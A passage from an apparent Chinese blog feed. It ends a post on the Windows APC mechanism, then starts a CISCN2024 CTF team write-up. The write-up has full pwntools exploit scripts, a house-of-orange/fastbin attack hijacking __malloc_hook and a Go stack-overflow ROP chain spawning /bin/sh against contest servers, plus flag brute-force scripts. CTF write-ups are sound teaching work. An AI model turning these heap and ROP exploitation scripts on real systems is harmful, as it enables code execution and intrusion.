KAPC_STATE，它的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KAPC_STATE</span> &#123;</span></span><br><span class="line">    LIST_ENTRY ApcListHead[MaximumMode];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPROCESS</span> *<span class="title">Process</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        UCHAR InProgressFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            BOOLEAN KernelApcInProgress : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN SpecialApcInProgress : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    BOOLEAN KernelApcPending;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        BOOLEAN UserApcPendingAll;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            BOOLEAN SpecialUserApcPending : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN UserApcPending : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; KAPC_STATE, *PKAPC_STATE, *PRKAPC_STATE;</span><br></pre></td></tr></table></figure><p>里面有很明显的双向链表结构，并且有两个，对应了用户和内核的 APC 队列，它包含了 KAPC 结构体。其实这里看到这个结构体我突然想起来内核附加进程读取进程的虚拟内存的函数 <code>KeStackAttachProcess</code> 函数似乎有一个参数保存了这个结构体。它可以理解为是保存了一个APC队列和其它一些APC的信息，并且内核中的线程结构体 <code>_KTHREAD</code> 中存在一个成员就是 _KAPC_STATE。</p><ul><li>KernelApcInProgress：指示内核<code>APC</code>是否正在执行。</li><li>KernelApcPending：指示是否有正在等待执行的内核<code>APC</code>。</li><li>UserApcPending：指示是否有正在等待执行的用户<code>APC</code>。</li></ul><h3 id="线程的一些小tips"><a href="#线程的一些小tips" class="headerlink" title="线程的一些小tips"></a>线程的一些小tips</h3><p>这里有一些概念可能对于刚接触这些知识的人（比如我）有一些小小的震撼，比如：</p><blockquote><p>线程执行时独占CPU，线程不能被结束，挂起，恢复，一切的操作都是它自己主动调用的。举个极端的例子，假设一个线程屏蔽中断，代码保证不出现异常，如果不提供其它机制改变线程的行为，那么线程将永久占据 CPU。</p></blockquote><p>根据 Linux 迁移过来的一些知识点，一个进程（没有探究过线程，就类比了一下）被结束是因为某个进程调用了 kill 给进程发送了 9 号信号（SIG_KILL），内核循环遍历每个进程信号的时候，发现 SIG_KILL 信号就会强制中断该进程。</p><p>而 Windows 的线程如果是被结束，那么是被其它进程或线程提供给了它一个函数，让它自己执行，这个函数就是 APC（异步过程调用）了。</p><p>比如结束一个线程，就是将 exit 函数（Maybe）挂到了对应线程的 APC_STATE 里面的链表当中执行。在某些时刻（先留下疑惑），内核会检查链表中的内容，便会执行 APC 链表中的函数。这样看起来就好像是别的线程给它结束的了，但是其实是它自己调用了结束线程的函数。</p><h3 id="如何向线程插入APC"><a href="#如何向线程插入APC" class="headerlink" title="如何向线程插入APC"></a>如何向线程插入APC</h3><p>理论如上所示了，下面演示下如何插入 APC 执行。用户层下，插入 APC 的 API 为 QueueUserAPC 和 QueueUserAPC2。</p><h4 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h4><p>将用户模式异步过程调用（APC）对象添加到指定线程的 APC 队列。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">QueueUserAPC</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] PAPCFUNC  pfnAPC,</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] HANDLE    hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] ULONG_PTR dwData</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>三个参数也很好记：</p><ul><li>pfnAPC：APC 函数指针</li><li>hThread：要插入 APC 函数的线程的线程句柄</li><li>dwData：函数的参数</li></ul><h4 id="QueueUserAPC2"><a href="#QueueUserAPC2" class="headerlink" title="QueueUserAPC2"></a>QueueUserAPC2</h4><p>这个函数可以约等于上个函数的扩展。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">QueueUserAPC2</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PAPCFUNC             ApcRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE               Thread,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG_PTR            Data,</span></span></span><br><span class="line"><span class="params"><span class="function">    QUEUE_USER_APC_FLAGS Flags</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>多了一个参数</p><ul><li>Flags：用于修改用户模式 APC 的行为。</li></ul><p>它的参数类型是一个枚举类型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_QUEUE_USER_APC_FLAGS</span> &#123;</span><br><span class="line">    QUEUE_USER_APC_FLAGS_NONE,</span><br><span class="line">    QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,</span><br><span class="line">    QUEUE_USER_APC_CALLBACK_DATA_CONTEXT</span><br><span class="line">&#125; QUEUE_USER_APC_FLAGS;</span><br></pre></td></tr></table></figure><h3 id="线程何时执行APC"><a href="#线程何时执行APC" class="headerlink" title="线程何时执行APC"></a>线程何时执行APC</h3><p>根据 MSDN 的说法，特殊的用户模式 APC 严格在用户模式下运行，并且始终执行，即使目标线程不处于可警报等待（alertable）状态。</p><p>正常 APC 仅在线程处于可警报等待（alertable）状态时，才会执行 APC。这里就体现出了这个异步了，即插入 APC 动作是线程 A 完成的，什么时候执行由线程 B 完成的。</p><p>对于内核 APC，普通内核 APC 在 <code>IRQL=PASSIVE_LEVEL</code> 内核模式运行，特殊内核 APC 在 <code>IRQL=PASSIVE_LEVEL</code>，IRQL 即 Windows 实现的软件中断优先级。从低到高依次为：</p><ul><li><strong>PASSIVE_LEVEL</strong>：IRQL 最低级别,没有被屏蔽的中断，在这个级别上，线程执行用户模式，可以访问分页内存。</li><li><strong>APC_LEVEL</strong>：在这个级别上，只有APC级别的中断被屏蔽，可以访问分页内存。当有APC发生时，处理器提升到APC级别，这样，就屏蔽掉其它APC，为了和APC执行一些同步，驱动程序可以手动提升到这个级别。</li><li><strong>DISPATCH_LEVEL</strong>：屏蔽关闭的中断 - DISPATCH_LEVEL中断和APC_LEVEL中断被屏蔽。 可能会发生设备、时钟和电源故障中断。</li><li><strong>DIRQL</strong>：IRQL &lt; 处的所有中断 &#x3D; 驱动程序中断对象的 DIRQL。 可能会发生具有较高 DIRQL 值的设备中断，以及时钟和电源故障中断。</li></ul><p>有一个 API 可以直接将线程设置为 alertable 的状态，就是 SleepEx。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">SleepEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] DWORD dwMilliseconds,</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] BOOL  bAlertable</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>相比于 Sleep 函数，多了一个 bAlertable 参数，如果将这个参数置为 1，则线程变为 alertable 状态，休眠期间若发生 I&#x2F;O 完成回调，则函数立刻返回，或者当前线程存在 APC，则被中断直接调用 APC 函数，调用完毕之后直接返回。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">DWORD subthreadid;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode1\n&quot;</span>);</span><br><span class="line">    <span class="built_in">SleepEx</span>(INFINITE,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode2</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hThread = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)shellcode1, hThread, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)shellcode2, hThread, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;helloworld\n&quot;</span>);</span><br><span class="line">    <span class="built_in">SleepEx</span>(INFINITE,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段示例中也可以看出来，APC 可以被另一个 APC 中断。并且这里发现，如果删掉 shellcode1 中的 SleepEx 语句，则 shellcode2 同样会被执行。说明当线程处于 alertable 状态时，线程会尝试执行完所有的 APC（用户状态下）。</p><p>如果在执行 APC 函数的情况下插入了另一个 APC，则按照先进先出的顺序，直到执行完所有的 APC。当然，在第一个 SleepEx 返回之后，线程会从 alertable 状态中取消，在这之后插入 APC 则需要再次等待线程进入 alertable 状态。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章大概探索了一下 APC 这个有趣的机制，学跑先学走，学走先学爬。这里先简单了解一下用户 APC 的一些小东西，熟悉一下大概的机制，后面再去深入研究一些线程相关 API 和内核 APC 等。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1] <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/types-of-apcs">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/types-of-apcs</a></li><li>[2] <a href="https://www.cnblogs.com/wingsummer/p/15862919.html">https://www.cnblogs.com/wingsummer/p/15862919.html</a></li><li>[3] <a href="https://www.anquanke.com/post/id/254026">https://www.anquanke.com/post/id/254026</a></li><li>[4] <a href="https://dennisbabkin.com/inside_nt_apc/">https://dennisbabkin.com/inside_nt_apc/</a></li><li>[5] <a href="https://bbs.kanxue.com/thread-261589.htm">https://bbs.kanxue.com/thread-261589.htm</a></li></ul>]]></content>
    
    
    <summary type="html">学习一下Windows的APC机制</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="reverse" scheme="https://xia0ji233.github.io/categories/ctf/reverse/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="GameSec" scheme="https://xia0ji233.github.io/categories/Windows/GameSec/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN2024 初赛WP</title>
    <link href="https://xia0ji233.github.io/2024/05/19/CISCN2024/"/>
    <id>https://xia0ji233.github.io/2024/05/19/CISCN2024/</id>
    <published>2024-05-19T14:00:00.000Z</published>
    <updated>2024-05-19T14:33:41.185Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下CISCN2024的初赛</p><span id="more"></span><h1 id="WoodpeckerT1战队WRITEUP"><a href="#WoodpeckerT1战队WRITEUP" class="headerlink" title="WoodpeckerT1战队WRITEUP"></a>WoodpeckerT1战队WRITEUP</h1><h2 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h2><p>战队名称：WoodpeckerT1</p><p>战队排名：104</p><img src="/2024/05/19/CISCN2024/rank.png" class=""><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h3><p>经典堆题目，题目提示了 orange，想到 house of orange 的攻击手法，题目允许在再次编辑的时候溢出 8 个字节，show 和 free 的次数有限，因此先通过 house of orange 改变 topchunk 的 size。然后申请比 topchunk 更大的堆块，此时 topchunk 就会被 free 进入 unsorted chunk，再次申请并打印内容可以获得 glibc 的地址。然后就是利用 uaf 漏洞触发 fastbin attack 劫持 <code>__malloc_hook-0x23</code> 处的堆块，给 <code>malloc_hook</code> 写入 one_gadget 的地址。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./orange_cat_diary&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;8.147.128.96&#x27;</span>,<span class="number">13755</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/xia0ji233/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name.&#x27;</span>,<span class="string">&#x27;xia0ji233&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x0f91</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">1640</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0x10</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>)+p64(libc_addr+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b malloc&#x27;</span>)</span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="go-stack"><a href="#go-stack" class="headerlink" title="go_stack"></a>go_stack</h3><p>go的pwn虽然没有接触过，但是题目运行逻辑非常简单。这里可以用 pwndbg 的 cyclic 去确定溢出的位置。先生成很长的测试字符串 <code>cyclic 0x200</code>，输入之后得到 go 自带的返回地址错误，值为 <code>0x6361616161616169</code>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l <span class="string">&#x27;iaaaaaac&#x27;</span></span><br><span class="line">Finding cyclic pattern of 8 bytes: b<span class="string">&#x27;iaaaaaac&#x27;</span> (hex: 0x6961616161616163)</span><br><span class="line">Found at offset 464</span><br></pre></td></tr></table></figure><p>随后就是构造 ROP 链，利用 ROPgadget 工具找到 gadget 位置即可开打。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">frompwnimport*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">file_name=<span class="string">&#x27;./gostack&#x27;</span></span><br><span class="line">elf=ELF(file_name)</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="comment">#p=process(file_name)</span></span><br><span class="line">p=remote(<span class="string">&#x27;8.147.133.63&#x27;</span>,<span class="number">12953</span>)</span><br><span class="line">syscall=<span class="number">0x0000000000404043</span></span><br><span class="line">rax_ret=<span class="number">0x000000000040f984</span></span><br><span class="line">rdi_6_ret=<span class="number">0x00000000004a18a5</span></span><br><span class="line">rsi_ret=<span class="number">0x000000000042138a</span></span><br><span class="line">rdx_ret=<span class="number">0x00000000004944ec</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;message:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(elf.bss())+p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">0x18</span></span><br><span class="line">payload+=p64(rdi_6_ret)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(rsi_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(rdx_ret)+p64(<span class="number">0x100</span>)+p64(rax_ret)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">payload+=p64(rdi_6_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload+=p64(rdi_6_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload+=p64(rdi_6_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0</span>)+p64(rax_ret)+p64(<span class="number">59</span>)+p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h3><p>程序对两个变量进行加乘和异或操作</p><img src="/2024/05/19/CISCN2024/5.png" class=""><p>找到数据存储位置</p><img src="/2024/05/19/CISCN2024/6.png" class=""><p>对十六进制数据逆向操作，先加30再进行异或，减20后除80</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = s.split(&quot;\n&quot;)</span><br><span class="line">l = []</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    x = s[i].split(&quot; &quot;)[1]</span><br><span class="line">    l.append(x)</span><br><span class="line">for i in range(0, len(l), 4):</span><br><span class="line">    x = l[i:i + 4]</span><br><span class="line">    p = int(x[1] + x[0], 16)</span><br><span class="line">    flag += chr((((p - 30) ^ 0x4d) - 20) // 80)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>s为原始数据此处省略</p><h3 id="whereThel1b"><a href="#whereThel1b" class="headerlink" title="whereThel1b"></a>whereThel1b</h3><p>给的附件可以直接运行，多次尝试发现只有调用 trytry 函数是校验的，可以算出密文列表，多次修改发现，单个密文只能影响1到2个字节，于是可以尝试手动爆破，在字符集当中进行遍历，观测密文是否一致。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> whereThel1b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = input(&quot;where is my flag:&quot;)</span></span><br><span class="line"><span class="comment"># flag = flag.encode()</span></span><br><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>, <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line"><span class="comment">#whereThel1b.whereistheflag(flag)</span></span><br><span class="line">flagprefix=<span class="string">&#x27;flag&#123;7f9a2d3c-07de-11ef-be5e-cf1e88674c0b&#125;&#x27;</span></span><br><span class="line">flagsuffix=<span class="string">&#x27;a&#x27;</span>*(<span class="number">42</span>-<span class="built_in">len</span>(flagprefix)-<span class="number">1</span>)</span><br><span class="line">l=<span class="number">56</span></span><br><span class="line">t=<span class="string">&#x27;0123456789abcdef-&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">    flag=flagprefix+i+flagsuffix</span><br><span class="line">    flag=flag.encode()</span><br><span class="line">    <span class="comment"># whereThel1b.whereistheflag(flag)</span></span><br><span class="line">    ret = whereThel1b.trytry(flag)</span><br><span class="line">    <span class="keyword">if</span> ret[:l]==encry[:l]:</span><br><span class="line">        <span class="built_in">print</span>(ret[<span class="number">40</span>:],<span class="built_in">len</span>(ret))</span><br><span class="line">        <span class="built_in">print</span>(encry[<span class="number">40</span>:],<span class="built_in">len</span>(encry))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="comment"># break</span></span><br></pre></td></tr></table></figure><p>有些地方会有多个可能的字符，因此需要调大参数 <code>l</code> 一个一个试过去，最后得到了正确的 flag。</p><h3 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb_debug"></a>gdb_debug</h3><p>这题经过仔细地调试还是发现基本单字节模式的加密，于是也爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 